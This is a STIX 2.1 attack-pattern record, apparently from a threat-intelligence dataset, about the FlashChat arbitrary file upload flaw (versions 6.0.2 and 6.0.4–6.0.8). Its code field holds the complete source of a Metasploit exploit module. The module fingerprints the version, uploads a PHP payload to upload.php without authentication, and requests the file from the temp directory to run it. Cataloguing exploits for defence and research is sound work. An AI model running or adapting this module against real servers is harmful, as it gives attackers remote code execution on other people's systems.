{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b596b7d3-2451-48d9-938d-9b90e062c565",
    "created": "2024-08-14T17:13:34.230438Z",
    "modified": "2024-08-14T17:13:34.230442Z",
    "name": "\"FlashChat Arbitrary File Upload\"",
    "description": " This module exploits a file upload vulnerability found in FlashChat versions 6.0.2 and 6.0.4 to 6.0.8. Attackers can abuse the upload feature in order to upload malicious PHP files without authentication which results in arbitrary remote code execution as the web server user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/flashchat_upload_exec.rb",
            "external_id": "flashchat_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"FlashChat Arbitrary File Upload\",\n      'Description'    => %q{\n        This module exploits a file upload vulnerability found in FlashChat\n        versions 6.0.2 and 6.0.4 to 6.0.8. Attackers can abuse the upload\n        feature in order to upload malicious PHP files without authentication\n        which results in arbitrary remote code execution as the web server user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'x-hayben21', # Discovery and PoC\n          'bcoles'  # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '98233'],\n          ['EDB', '28709']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\"\n        },\n      'Arch'           => ARCH_PHP,\n      'Platform'       => 'php',\n      'Targets'        =>\n        [\n          # Tested on FlashChat version 6.0.8\n          [ 'Generic (PHP Payload)', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-10-04',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to FlashChat', '/chat/'])\n        ])\n  end\n\n  #\n  # Checks if target is running FlashChat versions 6.0.2, 6.0.4 to 6.0.8\n  #\n  def check\n    uri = normalize_uri(target_uri.path, '')\n    res = send_request_raw({'uri' => uri})\n\n    if not res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    version = res.body.scan(/<title>FlashChat v([\\d\\.]+)/).flatten[0] || ''\n\n    if version.empty?\n      return Exploit::CheckCode::Unknown\n    end\n\n    vprint_status(\"Version found: #{version}\")\n\n    if version =~ /6\\.0\\.(2|4|5|6|7|8)/\n      return Exploit::CheckCode::Appears\n    elsif version <= \"6.0.8\"\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n  end\n\n\n  #\n  # Uploads our malicious file\n  # Stolen from havalite_upload_exec.rb\n  #\n  def upload(base)\n    fname = \"#{rand_text_alphanumeric(rand(10)+6)}.php\"\n    php   = \"<?php #{payload.encoded} ?>\"\n    data = Rex::MIME::Message.new\n    data.add_part(php, \"application/octet-stream\", nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{fname}\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(base, 'upload.php'),\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => post_data\n    })\n\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Request timed out while uploading\")\n    elsif res.code.to_i == 404\n      fail_with(Failure::NotFound, \"#{peer} - No upload.php found\")\n    elsif res.code.to_i == 500\n      fail_with(Failure::Unknown, \"#{peer} - Unable to write #{fname}\")\n    end\n\n    return fname\n  end\n\n\n  #\n  # Executes our uploaded malicious file\n  # Stolen from havalite_upload_exec.rb\n  #\n  def exec(base, payload_fname)\n    res = send_request_raw({\n      'uri' => normalize_uri(base, 'temp', payload_fname)\n    })\n\n    if res and res.code == 404\n      fail_with(Failure::NotFound, \"#{peer} - Not found: #{payload_fname}\")\n    end\n  end\n\n  def exploit\n    base = target_uri.path\n\n    # upload\n    print_status(\"Uploading malicious file...\")\n    fname = upload(base)\n\n    # register the file to clean\n    register_files_for_cleanup(fname)\n\n    # exec\n    print_status(\"Executing #{fname}...\")\n    exec(base, fname)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-04",
    "x_mitre_platforms": [
        "php'"
    ]
}